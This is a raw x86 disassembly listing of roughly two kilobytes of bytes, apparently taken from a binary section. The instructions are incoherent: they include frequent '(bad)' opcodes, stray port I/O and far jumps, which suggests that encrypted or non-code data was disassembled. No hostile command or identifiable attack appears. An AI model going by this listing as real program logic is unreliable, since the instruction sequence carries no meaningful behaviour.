  4048cf:	scas   eax,DWORD PTR es:[edi]
  4048d0:	dec    eax
  4048d1:	add    eax,esp
  4048d3:	add    DWORD PTR [esi+0x23901d47],0xfffffffd
  4048da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048db:	and    esi,ecx
  4048dd:	in     eax,dx
  4048de:	cmp    ecx,eax
  4048e0:	ss call 0x82f3:0xaaad3b25
  4048e8:	dec    edx
  4048e9:	out    dx,al
  4048ea:	sub    al,0x47
  4048ec:	cli    
  4048ed:	xchg   esi,eax
  4048ee:	xor    eax,0x11ad49b0
  4048f3:	cmp    eax,0x303c0015
  4048f8:	push   eax
  4048f9:	neg    BYTE PTR [ebx+eax*8]
  4048fc:	les    ebp,FWORD PTR [edx+0x76]
  4048ff:	(bad)  
  404900:	dec    edx
  404901:	ja     0x404917
  404903:	mov    ds:0x7b911238,eax
  404908:	adc    DWORD PTR [ecx+ecx*1+0x3465b96f],edx
  40490f:	int3   
  404910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404911:	iret   
  404912:	es dec edx
  404914:	xchg   esi,eax
  404915:	fs out dx,al
  404917:	fld    TBYTE PTR [eax+0x23a2f1fb]
  40491d:	push   ds
  40491e:	mov    ah,0x45
  404920:	mov    edx,0x6176bf18
  404925:	lock arpl WORD PTR [edi+0x10],bp
  404929:	fs ret 
  40492b:	dec    edi
  40492c:	inc    eax
  40492d:	xlat   BYTE PTR ds:[ebx]
  40492e:	arpl   WORD PTR [esi+eax*8],dx
  404931:	dec    ebp
  404932:	rcr    DWORD PTR [ebx+0x76ace3ff],cl
  404938:	mov    dh,BYTE PTR [ecx+eax*8]
  40493b:	(bad)  
  40493c:	sub    BYTE PTR [esi+edx*8],0xa3
  404940:	mov    ?,WORD PTR [bx+di-0x29]
  404944:	lds    esi,FWORD PTR [edi*4-0x17ebc878]
  40494b:	sbb    DWORD PTR [esp+ecx*8+0x52],ebx
  40494f:	dec    eax
  404950:	or     al,ch
  404952:	jl     0x404976
  404954:	and    DWORD PTR [edi-0x5c],0xffffff8b
  404958:	cld    
  404959:	bound  esi,QWORD PTR [ebx+0x780cc9f1]
  40495f:	or     bh,BYTE PTR [esi-0x4e]
  404962:	out    dx,al
  404963:	cdq    
  404964:	enter  0xe254,0x58
  404968:	arpl   WORD PTR [ecx+edi*1+0x51c23746],bp
  40496f:	mov    al,0xf6
  404971:	mov    al,0xab
  404973:	jl     0x4049d0
  404975:	(bad)
  404979:	pop    edx
  40497a:	adc    al,0xb1
  40497c:	ins    DWORD PTR es:[edi],dx
  40497d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40497e:	rcr    DWORD PTR [ecx-0x68],0x2d
  404982:	das    
  404983:	cmp    BYTE PTR [edx],dl
  404985:	pusha  
  404986:	cmp    ch,BYTE PTR [edx-0x20291794]
  40498c:	xchg   esp,eax
  40498d:	inc    esp
  40498e:	jnp    0x4049f3
  404990:	push   ebx
  404991:	stc    
  404992:	add    eax,DWORD PTR [ebx+edi*1-0x2f086c43]
  404999:	imul   BYTE PTR [ecx+0x16c9587a]
  40499f:	fsub   DWORD PTR [esi+ebp*4-0x5285ed6]
  4049a6:	jnp    0x404a08
  4049a8:	xor    DWORD PTR [eax],ebx
  4049aa:	jle    0x404930
  4049ac:	add    eax,0x16b8b467
  4049b1:	leave  
  4049b2:	or     edi,DWORD PTR ds:0xc4be245b
  4049b8:	adc    al,0xeb
  4049ba:	sti    
  4049bb:	popf   
  4049bc:	xchg   edi,eax
  4049bd:	xor    DWORD PTR [eax+0x6ffd027f],edi
  4049c3:	xchg   ebx,eax
  4049c4:	mov    al,0xad
  4049c6:	popa   
  4049c7:	ds retf 
  4049c9:	idiv   DWORD PTR [eax+0x2b1df1ba]
  4049cf:	into   
  4049d0:	neg    esp
  4049d2:	push   ebx
  4049d3:	dec    eax
  4049d4:	jl     0x4049d1
  4049d6:	sbb    DWORD PTR [ebx+0x60],0xe9a5c7de
  4049dd:	or     DWORD PTR [ebx-0x79db9680],eax
  4049e3:	push   esi
  4049e4:	pusha  
  4049e5:	add    BYTE PTR [eax-0x601d8c],ch
  4049eb:	add    al,0xa3
  4049ed:	mov    WORD PTR [edi],ss
  4049ef:	push   DWORD PTR [edx+0x440a7bd]
  4049f5:	add    al,0x37
  4049f7:	xor    esp,DWORD PTR [esi]
  4049f9:	loope  0x4049af
  4049fb:	mov    ch,0x67
  4049fd:	mov    gs,WORD PTR [ebx+ebx*4]
  404a00:	pop    ds
  404a01:	xchg   esp,eax
  404a02:	mov    dl,0xd9
  404a04:	sbb    BYTE PTR [edi+esi*2],dh
  404a07:	cwde   
  404a08:	cmp    eax,0x2fe7d0c0
  404a0d:	nop
  404a0e:	scas   al,BYTE PTR es:[edi]
  404a0f:	cli    
  404a10:	jnp    0x404996
  404a12:	popa   
  404a13:	pop    ss
  404a14:	cmc    
  404a15:	jmp    0xe4da027b
  404a1a:	in     al,dx
  404a1b:	jge    0x4049c9
  404a1d:	les    esp,FWORD PTR [ebx-0x6ccde87]
  404a23:	neg    ch
  404a25:	shr    DWORD PTR [edi+0x5d9733fb],0x84
  404a2c:	adc    eax,0x2895b2b1
  404a31:	mov    eax,ds:0xaa59199a
  404a36:	or     cl,dl
  404a38:	lock adc DWORD PTR [esp+ebp*1-0x3e],ebp
  404a3d:	or     al,0x2d
  404a3f:	pop    ebx
  404a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a41:	sbb    bl,BYTE PTR [ebx]
  404a43:	cld    
  404a44:	mov    al,ds:0x9bd2ae7f
  404a49:	mov    eax,ds:0x289a3f50
  404a4e:	add    eax,DWORD PTR [ecx+0x7ad1075a]
  404a54:	jle    0x404a9c
  404a56:	aad    0x8e
  404a58:	gs std 
  404a5a:	jp     0x404a6c
  404a5c:	or     DWORD PTR [edx+0x29edee54],0xffffff97
  404a63:	ret    0xff23
  404a66:	clc    
  404a67:	mov    esp,0xcdc6fe95
  404a6c:	adc    dl,0x68
  404a6f:	out    0xe6,al
  404a71:	dec    esi
  404a72:	xchg   ebx,eax
  404a73:	imul   esi,DWORD PTR [ebp+0x609e8cfb],0xffffff97
  404a7a:	jo     0x404a66
  404a7c:	ins    DWORD PTR es:[edi],dx
  404a7d:	loop   0x404af2
  404a7f:	pop    ds
  404a80:	mov    ecx,0x69fdd775
  404a85:	stc    
  404a86:	aam    0xb7
  404a88:	aam    0xc7
  404a8a:	mov    DWORD PTR [bp+si+0x44],edx
  404a8e:	(bad)  
  404a8f:	mov    esp,0xc06e8c5
  404a94:	or     BYTE PTR [edi-0x50e8170f],0xb7
  404a9b:	sbb    esp,edi
  404a9d:	adc    BYTE PTR [ebp+esi*2+0x134f5dfe],dh
  404aa4:	cmp    bh,BYTE PTR ds:0xe8aed826
  404aaa:	in     eax,0xe4
  404aac:	inc    ecx
  404aad:	pop    ebp
  404aae:	jge    0x404a3d
  404ab0:	push   ss
  404ab1:	add    ebx,0x20
  404ab4:	fs pop ss
  404ab6:	jmp    0x404a91
  404ab8:	pop    ebp
  404ab9:	lods   eax,DWORD PTR ds:[esi]
  404aba:	retf   0x15f0
  404abd:	sub    DWORD PTR [edx+ebp*2],esi
  404ac0:	stos   DWORD PTR es:[edi],eax
  404ac1:	pusha  
  404ac2:	sbb    eax,0xa3d3c81f
  404ac7:	dec    ebp
  404ac8:	sub    BYTE PTR [eax+0x4a12d318],cl
  404ace:	pushf  
  404acf:	push   0x1d
  404ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ad3:	pop    ebx
  404ad4:	mov    al,ds:0xda277541
  404ad9:	inc    edi
  404ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404adb:	ss mov ebp,edi
  404ade:	nop
  404adf:	and    DWORD PTR ds:0xc6c95c81,0xffffff9b
  404ae6:	in     al,0x39
  404ae8:	add    dh,BYTE PTR [eax+0x6]
  404aeb:	adc    eax,0x77245f74
  404af0:	ror    DWORD PTR [esi],0x8e
  404af3:	xor    BYTE PTR [esi+0x42],ah
  404af6:	sahf   
  404af7:	jno    0x404b4e
  404af9:	dec    edi
  404afa:	and    eax,0xba90ffe7
  404aff:	ds xor ah,bl
  404b02:	(bad)  [ebp+0x1195a668]
  404b08:	(bad)  ds:0xb90bd76d
  404b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b0f:	fadd   QWORD PTR [edi-0x42]
  404b12:	pop    esi
  404b13:	into   
  404b14:	cmc    
  404b15:	dec    edx
  404b16:	fst    DWORD PTR [esi-0x43]
  404b19:	xor    cl,BYTE PTR [eax]
  404b1b:	rcl    DWORD PTR [esi],cl
  404b1d:	xchg   esi,eax
  404b1e:	add    eax,0xff0e8133
  404b23:	add    dl,BYTE PTR [eax-0x7f]
  404b26:	or     DWORD PTR [eax+0x16fb0b6a],esi
  404b2c:	or     BYTE PTR [esi-0x2],bh
  404b2f:	mov    al,ds:0xc3313a76
  404b34:	or     BYTE PTR [edi],al
  404b36:	addr16 mov edx,0xa5bd52c9
  404b3c:	mov    ds:0xe332555d,al
  404b41:	and    eax,0xe9ca9824
  404b46:	mul    BYTE PTR [ebp+0x7cf28f5c]
  404b4c:	cmp    DWORD PTR ds:0x2224,esp
  404b51:	lahf   
  404b52:	and    al,0x65
  404b54:	or     bh,bl
  404b56:	es jne 0x404b41
  404b59:	and    DWORD PTR [eax+esi*1],0x60057fd0
  404b60:	xchg   ecx,eax
  404b61:	fstp   QWORD PTR [eax]
  404b63:	xchg   esi,eax
  404b64:	aas    
  404b65:	xor    esp,ebx
  404b67:	pop    edx
  404b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b69:	retf   
  404b6a:	(bad)  
  404b6b:	sub    eax,0xaae4a3f
  404b70:	sub    bh,BYTE PTR ds:0xcf8ab384
  404b76:	jle    0x404b5c
  404b78:	cmp    bl,BYTE PTR [edx+0x5af3d8f9]
  404b7e:	(bad)  
  404b80:	in     al,0x73
  404b82:	popf   
  404b83:	fcmovnu st,st(1)
  404b85:	adc    DWORD PTR [eax-0x58],esi
  404b88:	scas   eax,DWORD PTR es:[edi]
  404b89:	and    DWORD PTR [esp+ebp*1],esi
  404b8c:	lods   al,BYTE PTR ds:[esi]
  404b8d:	mov    esp,DWORD PTR [ecx-0x54a79afd]
  404b93:	fdivp  st(5),st
  404b95:	mov    al,ds:0x23c80cf4
  404b9a:	clc    
  404b9b:	sbb    esp,DWORD PTR [esi]
  404b9d:	test   bl,0x2d
  404ba0:	and    eax,DWORD PTR ds:0xd13126f1
  404ba6:	sti    
  404ba7:	push   ss
  404ba8:	popa   
  404ba9:	adc    al,0x96
  404bab:	les    ebp,FWORD PTR [ebx-0x7dca6f11]
  404bb1:	cmp    al,0xa3
  404bb3:	adc    eax,0x904ebd15
  404bb8:	dec    edi
  404bb9:	cmp    BYTE PTR [edx-0x451b12c3],0x24
  404bc0:	mov    ecx,0xb389bc67
  404bc5:	push   cs
  404bc6:	push   ebx
  404bc7:	fdivr  QWORD PTR [ebp-0x3d]
  404bca:	hlt    
  404bcb:	(bad)  
  404bcc:	and    DWORD PTR [esi-0x62],edx
  404bcf:	mov    esi,0xc92bb363
  404bd4:	les    ebp,FWORD PTR ds:0xb627d55a
  404bda:	(bad)  [esi]
  404bdc:	adc    eax,0x1f90888
  404be1:	aaa    
  404be2:	in     eax,dx
  404be3:	iret   
  404be4:	gs pop edi
  404be6:	or     eax,DWORD PTR [edi-0x1ddeaef6]
  404bec:	loop   0x404be7
  404bee:	cld    
  404bef:	xchg   ebx,eax
  404bf0:	jl     0x404bd5
  404bf2:	sahf   
  404bf3:	or     DWORD PTR [edi],ecx
  404bf5:	cld    
  404bf6:	jnp    0x404bd5
  404bf8:	loope  0x404b7b
  404bfa:	sar    BYTE PTR [edx-0x56],0xf0
  404bfe:	dec    di
  404c00:	push   es
  404c01:	loop   0x404bf2
  404c03:	or     edx,DWORD PTR [esi]
  404c05:	(bad)  
  404c06:	fidiv  DWORD PTR [edx+0x31]
  404c09:	je     0x404b9f
  404c0b:	ret    0x63cd
  404c0e:	inc    si
  404c10:	icebp  
  404c11:	jnp    0x404c48
  404c13:	mov    ds:0x63113fde,al
  404c18:	pop    esp
  404c19:	add    bh,bh
  404c1b:	pop    esp
  404c1c:	pop    edi
  404c1d:	call   0xc768:0x147562c
  404c24:	inc    esi
  404c25:	adc    esi,ebx
  404c27:	push   esp
  404c28:	xor    ebx,ebp
  404c2a:	je     0x404c10
  404c2c:	add    eax,0x2d733396
  404c31:	sbb    eax,0x43b2e784
  404c36:	in     eax,0xbd
  404c38:	sti    
  404c39:	jb     0x404c7e
  404c3b:	call   0x8cf0c244
  404c40:	dec    eax
  404c41:	jge    0x404bfb
  404c43:	sbb    BYTE PTR [ebp+0x72],cl
  404c46:	push   ecx
  404c47:	jo     0x404c5a
  404c49:	(bad)  
  404c4a:	adc    edx,DWORD PTR [ebx+0xb]
  404c4d:	inc    edx
  404c4e:	retf   0xb876
  404c51:	out    dx,al
  404c52:	and    ch,ch
  404c54:	cmp    edx,ebx
  404c56:	arpl   WORD PTR [edi-0x4611b2d1],sp
  404c5c:	sbb    eax,0x23c21c89
  404c61:	sub    ecx,ebp
  404c63:	sub    BYTE PTR [esi-0x1e5664ec],bh
  404c69:	test   BYTE PTR [ecx+0x31],bh
  404c6c:	lahf   
  404c6d:	jo     0x404c57
  404c6f:	cmps   WORD PTR ss:[esi],WORD PTR es:[edi]
  404c72:	xor    eax,0x669f3755
  404c77:	pop    eax
  404c78:	jb     0x404c17
  404c7a:	mov    esp,esp
  404c7c:	xor    dl,0xf9
  404c7f:	call   0x4415c3bd
  404c84:	sbb    eax,0xab8e717a
  404c89:	cli    
  404c8a:	xlat   BYTE PTR ds:[ebx]
  404c8b:	loopne 0x404cbf
  404c8d:	cs loop 0x404ce5
  404c90:	ja     0x404c8b
  404c92:	in     eax,0x28
  404c94:	push   es
  404c95:	cdq    
  404c96:	es mov ds,ebx
  404c99:	or     ah,BYTE PTR [esi-0x69]
  404c9c:	daa    
  404c9d:	push   ecx
  404c9e:	lock es aad 0x48
  404ca2:	sbb    edi,DWORD PTR [edi+edx*2]
  404ca5:	rol    DWORD PTR [eax-0x3d438c23],0x4e
  404cac:	xchg   edi,eax
  404cad:	mov    dh,0x6b
  404caf:	mov    edi,0x4b2033e3
  404cb4:	cs sbb eax,0xcc23b7c6
  404cba:	inc    edi
  404cbb:	xchg   ebx,eax
  404cbc:	mov    esi,0x6eb0af17
  404cc1:	dec    edx
  404cc2:	xchg   edi,edi
  404cc4:	pushf  
  404cc5:	and    al,0xe2
  404cc7:	fsub   st(7),st
  404cc9:	sbb    DWORD PTR [ebx],0xffffff9f
  404ccc:	pop    es
  404ccd:	std    
  404cce:	sbb    eax,0xa8ebdb5f
  404cd3:	popf   
  404cd4:	add    BYTE PTR [edx],al
  404cd6:	adc    al,0x70
  404cd8:	cmp    eax,0xb2cbe2c
  404cdd:	add    al,BYTE PTR [esi-0x28]
  404ce0:	stos   BYTE PTR es:[edi],al
  404ce1:	mov    WORD PTR [ebx*4+0x69d0d76],fs
  404ce8:	sbb    DWORD PTR [edx],ecx
  404cea:	push   ds
  404ceb:	jne    0x404d0c
  404ced:	pop    esp
  404cee:	fisttp QWORD PTR [edi]
  404cf0:	inc    ebp
  404cf1:	repz jns 0x404d52
  404cf4:	fwait
  404cf5:	(bad)  
  404cf6:	xor    ch,bh
  404cf8:	nop
  404cf9:	jge    0x404d2a
  404cfb:	jo     0x404cd7
  404cfd:	nop
  404cfe:	nop
  404cff:	pop    ebp
  404d00:	mov    eax,ds:0x66e7208d
  404d05:	push   ebp
  404d06:	inc    ecx
  404d07:	loopne 0x404cab
  404d09:	or     al,0xfd
  404d0b:	cmc    
  404d0c:	mov    ebx,0x280f82f6
  404d11:	add    eax,0x99621c28
  404d16:	ins    DWORD PTR es:[edi],dx
  404d17:	fldcw  WORD PTR [esi-0x7b26cccc]
  404d1d:	jbe    0x404d58
  404d1f:	fidivr WORD PTR [esi]
  404d21:	fucom  st(6)
  404d23:	or     ah,BYTE PTR [edx-0x66db771f]
  404d29:	aas    
  404d2a:	aam    0x9f
  404d2c:	lods   al,BYTE PTR ds:[esi]
  404d2d:	cmp    DWORD PTR [edx+0x71],esp
  404d30:	pop    ecx
  404d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d32:	es pop ebx
  404d34:	enter  0xa51b,0xb1
  404d38:	add    DWORD PTR [ebp+0x1d71be49],esi
  404d3e:	mov    ebx,0x367b6979
  404d43:	inc    esp
  404d44:	add    esp,DWORD PTR [esi+eiz*8-0x1d]
  404d48:	inc    edi
  404d49:	add    eax,0xf9673b65
  404d4e:	mov    bh,0x78
  404d50:	xor    eax,0xb9949dd5
  404d55:	loop   0x404d6e
  404d57:	push   0x6689b20c
  404d5c:	mov    esp,0x6426539d
  404d61:	push   es
  404d62:	jnp    0x404d3f
  404d64:	ss cmp al,0xf6
  404d67:	dec    esi
  404d68:	sub    DWORD PTR [esi],0x3a
  404d6b:	push   cs
  404d6c:	addr16 dec edi
  404d6e:	pushf  
  404d6f:	xchg   ecx,eax
  404d70:	mov    cl,0xd9
  404d72:	retf   
  404d73:	aad    0xfa
  404d75:	xor    BYTE PTR [edx-0x7c83af9],0x6e
  404d7c:	mov    cl,0x6a
  404d7e:	jg     0x404d76
  404d80:	lock (bad) 
  404d84:	cdq    
  404d85:	mov    edx,0xe63f411c
  404d8a:	fdivr  st(5),st
  404d8c:	lods   al,BYTE PTR ds:[esi]
  404d8d:	mov    al,0xad
  404d8f:	pop    ebx
  404d90:	sbb    edx,eax
  404d92:	push   cs
  404d93:	push   ebp
  404d94:	test   DWORD PTR [eax],esp
  404d96:	push   eax
  404d97:	sar    BYTE PTR [ebp-0x3f623814],0xf8
  404d9e:	aaa    
  404d9f:	push   esi
  404da0:	pop    es
  404da1:	mov    ebp,0xfa1150f0
  404da6:	lea    edi,[edx+0x67]
  404da9:	mov    bl,0x73
  404dab:	cmp    esi,DWORD PTR [ebx-0x39199c66]
  404db1:	retf   0xd776
  404db4:	dec    ebp
  404db5:	ins    BYTE PTR es:[edi],dx
  404db6:	call   DWORD PTR [edx+0x3a2295cb]
  404dbc:	dec    ecx
  404dbd:	mov    dl,BYTE PTR [esi]
  404dbf:	push   es
  404dc0:	xchg   edx,eax
  404dc1:	(bad)  
  404dc2:	sub    BYTE PTR [ebp-0x49],bh
  404dc5:	test   al,0x44
  404dc7:	xor    ebp,DWORD PTR [edx-0x4f306a57]
  404dcd:	pop    ds
  404dce:	retf   0xc797
  404dd1:	or     bh,BYTE PTR [eax+0xf276baf]
  404dd7:	or     edi,ebx
  404dd9:	push   edx
  404dda:	sar    BYTE PTR [eax-0x1b0f979],0x79
  404de1:	xchg   ebp,eax
  404de2:	in     al,0x11
  404de4:	pmuludq mm6,mm1
  404de7:	int    0xb5
  404de9:	mov    bh,0x97
  404deb:	pop    edi
  404dec:	sbb    DWORD PTR ds:0x964c7f6a,ebp
  404df2:	mov    dh,0x47
  404df4:	cmp    BYTE PTR [ebx+0x71cf6937],bl
  404dfa:	jmp    FWORD PTR [eax+edx*4]
  404dfd:	das    
  404dfe:	mov    dh,0x1c
  404e00:	push   eax
  404e01:	jb     0x404e12
  404e03:	adc    BYTE PTR ss:[edx],dh
  404e06:	cmp    eax,0x562e4a3
  404e0b:	mov    eax,DWORD PTR [ebx-0x4c]
  404e0e:	xchg   BYTE PTR [ecx+0x6f],bl
  404e11:	pop    edi
  404e12:	cli    
  404e13:	and    esp,0x662f5a95
  404e19:	mov    cl,dl
  404e1b:	(bad)  
  404e1c:	xor    ch,ch
  404e1e:	retf   
  404e1f:	in     eax,dx
  404e20:	push   edx
  404e21:	loop   0x404e03
  404e23:	inc    ebp
  404e24:	or     BYTE PTR [ebp-0x2c],ah
  404e27:	call   0xeb5f:0xd797229f
  404e2e:	pop    ebp
  404e2f:	sbb    edi,esi
  404e31:	or     al,0x90
  404e33:	xor    DWORD PTR [edi],eax
  404e35:	pop    ds
  404e36:	jecxz  0x404e50
  404e38:	data16 cmp al,0xd4
  404e3b:	or     dl,BYTE PTR [eax-0x6fd4b8f1]
  404e41:	scas   eax,DWORD PTR es:[edi]
  404e42:	push   edx
  404e43:	mov    al,0x9
  404e45:	(bad)  
  404e46:	jns    0x404e44
  404e48:	adc    eax,0x5ca6d51
  404e4d:	or     BYTE PTR [ecx-0x22],dl
  404e50:	lods   al,BYTE PTR es:[esi]
  404e52:	fs dec ebx
  404e54:	in     eax,dx
  404e55:	fistp  QWORD PTR [ecx]
  404e57:	pop    esp
  404e58:	inc    edx
  404e59:	int3   
  404e5a:	clc    
  404e5b:	add    al,0xc7
  404e5e:	jns    0x404df1
  404e60:	ins    BYTE PTR es:[edi],dx
  404e61:	je     0x404e89
  404e63:	cmp    al,0xc6
  404e65:	lock sbb ecx,DWORD PTR [eax+0x31f9ca45]
  404e6c:	add    bl,dh
  404e6e:	or     eax,0x62867ba9
  404e73:	les    esi,FWORD PTR [ebp+ebx*8-0x62]
  404e77:	mov    bl,0xe6
  404e79:	lods   eax,DWORD PTR ds:[esi]
  404e7a:	push   edx
  404e7b:	les    edi,FWORD PTR [eax+edi*1+0x2fe80930]
  404e82:	cmp    ecx,edi
  404e84:	imul   ebx,DWORD PTR [edx],0xc699ce0f
  404e8a:	xor    ecx,DWORD PTR [esi+0x6a0da1a9]
  404e90:	out    dx,eax
  404e91:	loope  0x404eaa
  404e93:	dec    ebx
  404e94:	test   DWORD PTR [esi+edi*1-0x4b4d7355],0xcf28e72f
  404e9f:	stos   DWORD PTR es:[edi],eax
  404ea0:	inc    ebp
  404ea1:	div    DWORD PTR [edx]
  404ea3:	into   
  404ea4:	push   0x7606738c
  404ea9:	push   esp
  404eaa:	adc    cl,BYTE PTR [edx-0xf824db2]
  404eb0:	test   al,0xe0
  404eb2:	jg     0x404ef2
  404eb4:	cmc    
  404eb5:	mov    dh,0x12
  404eb7:	and    al,0x53
  404eb9:	int    0xb9
  404ebb:	push   ecx
  404ebc:	jle    0x404f26
  404ebe:	test   DWORD PTR [esi],0xa61e41b4
  404ec4:	push   es
  404ec5:	mov    bh,BYTE PTR [esi-0xb7ee58f]
  404ecb:	mov    dl,0xf2
  404ecd:	iret   
  404ece:	or     eax,DWORD PTR [eax-0x67]
  404ed1:	sbb    ch,dl
  404ed3:	add    BYTE PTR [edx+0x2c6d4511],dl
  404ed9:	mov    bh,0x55
  404edb:	mov    ds:0x3116c09f,al
  404ee0:	push   ebp
  404ee1:	mul    BYTE PTR [eax+0x36]
  404ee4:	sub    DWORD PTR [edx-0x10],0x83df3c24
  404eeb:	ror    DWORD PTR [ecx],cl
  404eed:	in     eax,0x38
  404eef:	shl    DWORD PTR [ecx],cl
  404ef1:	leave  
  404ef2:	push   dx
  404ef4:	je     0x404efa
  404ef6:	lds    edi,FWORD PTR [edx]
  404ef8:	ja     0x404f6c
  404efa:	sbb    al,0x80
  404efc:	out    0x33,eax
  404efe:	scas   al,BYTE PTR es:[edi]
  404eff:	(bad)  
  404f00:	sar    BYTE PTR [esp+esi*2],1
  404f03:	xor    edi,DWORD PTR [eax-0x16a875db]
  404f09:	pushf  
  404f0a:	cwde   
  404f0b:	xchg   ecx,eax
  404f0c:	sub    ah,BYTE PTR [ebx-0x3a1dc8da]
  404f12:	push   ds
  404f13:	sbb    dh,BYTE PTR [edx+eiz*1]
  404f16:	outs   dx,DWORD PTR ds:[esi]
  404f17:	mov    eax,DWORD PTR [esi+0x58755d56]
  404f1d:	in     al,dx
  404f1e:	sti    
  404f1f:	aad    0x4a
  404f21:	jge    0x404ed4
  404f23:	test   BYTE PTR [edx],ah
  404f25:	fstp   QWORD PTR [edx]
  404f27:	or     al,0x2c
  404f29:	and    eax,0xe89dc550
  404f2e:	mov    bh,0x5f
  404f30:	fidivr WORD PTR [edx-0x795c8571]
  404f36:	pop    esp
  404f37:	mov    cs,esi
  404f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3a:	sbb    ch,bh
  404f3c:	add    eax,0xf3076e3f
  404f41:	pop    ebx
  404f42:	stos   BYTE PTR es:[edi],al
  404f43:	sbb    ch,al
  404f45:	stc    
  404f46:	loopne 0x404f81
  404f48:	jg     0x404f6a
  404f4a:	dec    ecx
  404f4b:	scas   eax,DWORD PTR es:[edi]
  404f4c:	xchg   BYTE PTR [edx+0x160a3ed7],al
  404f52:	dec    ebx
  404f53:	xor    al,0x33
  404f55:	enter  0x9917,0x37
  404f59:	mov    ebx,0x34b9379c
  404f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5f:	sbb    edi,DWORD PTR [ebp+eiz*4+0x69927265]
  404f66:	call   0x5a29bf1b
  404f6b:	jmp    0x2244:0x5a304ed4
  404f72:	in     al,0x5b
  404f74:	push   es
  404f75:	scas   al,BYTE PTR es:[edi]
  404f76:	dec    eax
  404f77:	cmc    
  404f78:	dec    ebx
  404f79:	into   
  404f7a:	or     DWORD PTR [edi+0x2f],ecx
  404f7d:	jmp    0xffe2:0x733a4977
  404f84:	push   esp
  404f85:	iret   
  404f86:	mov    gs,WORD PTR [edi]
  404f88:	sbb    eax,0x3d4d66bf
  404f8d:	test   eax,0x74c1d059
  404f92:	add    BYTE PTR [ebx+0x2d01b94c],bl
  404f98:	hlt    
  404f99:	test   eax,0xbac6b8af
  404f9e:	inc    ebp
  404f9f:	ret    0xc032
  404fa2:	or     dl,BYTE PTR [ecx+eiz*1]
  404fa5:	pusha  
  404fa6:	out    dx,eax
  404fa7:	mov    eax,0xa744f4fd
  404fac:	scas   al,BYTE PTR es:[edi]
  404fad:	mov    edx,0x935eef4e
  404fb2:	dec    esi
  404fb3:	aad    0xe7
  404fb5:	std    
  404fb6:	dec    esi
  404fb7:	ins    BYTE PTR es:[edi],dx
  404fb8:	sub    BYTE PTR [ecx+0x40d92111],al
  404fbe:	jns    0x404ff5
  404fc0:	loopne 0x405027
  404fc2:	retf   
  404fc3:	ja     0x404f53
  404fc5:	push   0xb5ebff8f
  404fca:	cmp    eax,0x5121f262
  404fcf:	dec    esi
  404fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd1:	push   0xfffffffb
  404fd3:	test   edx,eax
  404fd5:	push   0xf0f34203
  404fda:	mov    dl,0x79
  404fdc:	adc    DWORD PTR [ebx],esi
  404fde:	inc    edx
  404fdf:	push   edx
  404fe0:	add    eax,0x96d2faf1
  404fe5:	mov    ebx,0x58295c2
  404fea:	dec    edx
  404feb:	mov    cl,0xf8
  404fed:	aad    0x37
  404fef:	cli    
  404ff0:	push   esp
  404ff1:	add    eax,0x73450349
  404ff6:	add    BYTE PTR [esi+0x61],bl
  404ff9:	add    eax,0x6dc6988b
  404ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fff:	mov    bl,cl
  405001:	in     al,0x65
  405003:	stc    
  405004:	ins    BYTE PTR es:[edi],dx
  405005:	mov    eax,0x21ef16d
  40500a:	sub    dl,ah
  40500c:	dec    edi
  40500d:	pushf  
  40500e:	sbb    edx,DWORD PTR [ecx+ebp*8-0x769efe64]
  405015:	or     cl,BYTE PTR [eax+0x52]
  405018:	lds    ebx,FWORD PTR [ecx+0x54]
  40501b:	adc    edx,DWORD PTR [edi]
  40501d:	mov    eax,0x27416050
  405022:	fnstenv [ebp-0x745c499f]
  405028:	dec    eax
  405029:	inc    edx
  40502a:	fnsave fs:[esi-0x7f08f578]
  405031:	inc    ecx
  405032:	xor    DWORD PTR [ebx],edx
  405034:	test   al,0x76
  405036:	add    BYTE PTR [esi+0x14],al
  405039:	sar    BYTE PTR [esi+0x1e],cl
  40503c:	xlat   BYTE PTR ds:[ebx]
  40503d:	loopne 0x40501d
  40503f:	mov    al,ds:0xca4a74
  405044:	jns    0x40506a
  405046:	loopne 0x404fef
  405048:	sub    al,0xc6
  40504a:	jbe    0x4050ab
  40504c:	cld    
  40504d:	dec    ecx
  40504e:	repz sub eax,0x2f598e08
  405054:	js     0x4050aa
  405056:	arpl   WORD PTR [edx],di
  405058:	dec    esp
  405059:	(bad)  
  40505a:	dec    esi
  40505b:	js     0x405093
  40505d:	cmc    
  40505e:	test   BYTE PTR [esi-0x27e8b739],bh
  405064:	push   edx
  405065:	aam    0xa2
  405067:	(bad)  
  405068:	xchg   ebp,eax
  405069:	lea    esi,[eax+0x2e74ea0d]
  40506f:	cmp    al,0x47
  405071:	jae    0x405060
  405073:	rcr    DWORD PTR ds:0x6e9e688f,1
  405079:	addr16 loope 0x4050ed
  40507c:	iret   
  40507d:	ins    DWORD PTR es:[edi],dx
  40507e:	or     al,0x29
  405080:	in     al,0x44
  405082:	push   0xfffffffa
  405084:	sub    eax,0xe7f0112b
  405089:	jae    0x40508f
  40508b:	sub    al,0x9b
  40508d:	sbb    eax,0x693b4db3
  405092:	mov    dl,0x6c
  405094:	int3   
  405095:	mov    DWORD PTR [esi-0x7a],ecx
  405098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405099:	fnstsw WORD PTR [edi+0x24bda225]
  40509f:	ins    BYTE PTR es:[edi],dx
  4050a0:	xor    bl,dl
  4050a2:	loopne 0x405095
  4050a4:	dec    ebp
  4050a5:	test   DWORD PTR ds:0x4a47cbec,edx
  4050ab:	xchg   BYTE PTR [ecx+0x5d],bh
  4050ae:	pop    ss
  4050af:	dec    ebx
  4050b0:	xchg   DWORD PTR [edi+0x72],eax
  4050b3:	aam    0xf4
  4050b5:	push   ss
  4050b6:	sbb    eax,eax
  4050b8:	mov    edx,0xc5bdcc67
  4050bd:	or     eax,0x76ff7b3
  4050c2:	mov    al,0xd9
